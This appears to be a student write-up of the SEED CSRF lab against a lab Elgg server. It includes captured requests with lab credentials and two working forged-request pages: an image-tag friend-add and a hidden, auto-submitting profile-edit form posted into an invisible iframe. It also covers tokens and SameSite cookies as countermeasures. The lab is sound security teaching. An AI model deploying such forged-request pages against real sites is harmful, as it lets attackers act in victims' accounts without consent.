# Cross-Site Request Forgery (CSRF) Attack Lab

## Task 1: Observing HTTP Request

### HTTP GET request

```
http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts=1747871495&__elgg_token=uVQFXJYUeZwwQRJgYx3Vpw&__elgg_ts=1747871495&__elgg_token=uVQFXJYUeZwwQRJgYx3Vpw
...
GET: HTTP/1.1 200 OK
```

Parameters:
+ `friend`: numeric ID of account to add as friend
+ `__elgg_ts` and `__elgg_token`: used for CSRF countermeasure

### HTTP POST request

```
http://www.seed-server.com/action/login
...
__elgg_token=GtDtrMTcyzKUss_fR3vKJg&__elgg_ts=1747870943&username=alice&password=seedalice
POST: HTTP/1.1 200 OK
...
```

Parameters:
+ `__elgg_token` and `__elgg_ts`: used for CSRF countermeasure
+ `username` and `password`: credentials for login

## Task 2: CSRF Attack using GET Request

We already have the structure of the Add-Friend HTTP GET request from Task 1; it remains to find the ID of Samy's account, which is `59`.

Contents of `addfriend.html`:

```html
<html>
<body>
<h1>This page forges an HTTP GET request</h1>
<img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
</body>
</html>
```

Visiting this page successfully triggers the Add-Friend HTTP Get request; Alice can see when she reloads Samy's profile page that she is now friends with him.

## Task 3: CSRF Attack using POST Request

We need to change some details on the hidden form:

+ `name`: `Alice`
+ `briefdescription`: `Samy is my Hero` :)
+ `guid`: `56` (Alice's user ID)

We also have to direct the form to send its POST request to `http://www.seed-server.com/action/profile/edit` via its `action` attribute.

One additional measure we can take is to avoid redirection to Alice's profile page upon submission of the form, which would immediately present the changed profile for Alice to see; we instead set the form's `target` attribute to an invisible `<iframe>`, and we can also make the form completely invisible while we're at it (instead of displaying `undefined` to the page), using `style: "display: none;"` for both.

Contents of `editprofile.html`:

```html
<html>
<body>
<h1>This page forges an HTTP POST request.</h1>
<iframe name="dummyframe" style="display: none;"></iframe>
<script type="text/javascript">

function forge_post()
{
    var fields;

    // The following are form entries need to be filled out by attackers.
    // The entries are made hidden, so the victim won't be able to see them.
    fields += "<input type='hidden' name='name' value='Alice'>";
    fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
    fields += "<input type='hidden' name='guid' value='56'>";

    // Create a <form> element.
    var p = document.createElement("form");

    // Construct the form
    p.action = "http://www.seed-server.com/action/profile/edit";
    p.innerHTML = fields;
    p.method = "post";
    p.target = "dummyframe";
    p.style = "display: none;";

    // Append the form to the current page.
    document.body.appendChild(p);

    // Submit the form
    p.submit();
}

// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post();}
</script>
</body>
</html>
```

Upon visiting this site and then checking Alice's profile page again, we can see that the profile edit is successful.

Samy is able to obtain Alice's user ID for use in this attack without being able to log into her account, by visiting her profile page and hovering over the `Add friend` button; the user ID of the account to add as a friend can then be seen in the tooltip URL, which is of the same GET request we saw in Task 2.

Samy will however not be able to launch this attack against anybody who visits his malicious web page. Even if the visitor has an active session with Elgg at the same time, the details of this session (such as the `Elgg` cookie and user ID) are not visible to Samy, who is just getting the visitor's browser to send a POST request with its own `Elgg` cookie attached; so, Samy is not able to put the correct user ID into the form.

## Task 4: Enabling Elgg's Countermeasure

After enabling the countermeasure, both attacks above are now unsuccessful. We saw in Task 1 the secret tokens in the captured HTTP requests; Samy is not able to find these out, as he is not actually accessing Elgg as Alice to be able to see the tokens in the page, but merely requesting that Alice's browser submit a particular forged GET or POST request.

## Task 5: Experimenting with the SameSite Cookie Method

When sending requests to `www.example32.com` from itself, all of the cookies associated with the site are sent by the browser. However, when sending requests to `www.example32.com` from `www.attacker32.com`, only `cookie-normal` and `cookie-lax` are visible for GET requests, and only `cookie-normal` is visible for POST requests; the SameSite cookies failed to make it through because the requests were cross-site requests.

This could be used by a server to detect whether a request is cross-site or same-site, by checking if a (strict) SameSite cookie which they have set in advance is present or absent from requests. For example, Elgg could make the `Elgg` session cookie a SameSite cookie, and then it would be absent from cross-site requests, which would stop the attacks from previous tasks from working.